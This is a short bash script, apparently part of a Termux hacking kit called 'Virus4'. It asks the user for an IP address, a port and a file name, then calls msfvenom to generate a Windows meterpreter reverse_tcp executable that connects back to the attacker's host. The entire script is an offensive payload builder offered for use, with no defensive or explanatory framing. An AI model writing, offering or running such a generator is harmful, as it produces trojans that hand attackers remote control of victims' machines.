#colors
g='\033[1;32m'
p='\033[1;35m'
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
y='\033[1;33m'
n=install




echo -e "$purple"
read -p "                  ip=====> " ipp
sleep 2
read -p "                      port===> " pp
sleep 2
read -p "                        name===> " nn

cd
cd metasploit-framework

msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ipp LPORT=$pp -f exe e >  /sdcard/Virus4/$nn.exe
echo -e "$cyan    Path of the pyload-----> $yellow  /sdcard/Virus4/$nn.exe"
echo -e "$purple end the payload+++++++++++++++++++++ "
sleep 2
cd $HOME/Virus4
read -p "                   -------->entar"
cd $HOME/Virus4
python2 Virus4.py
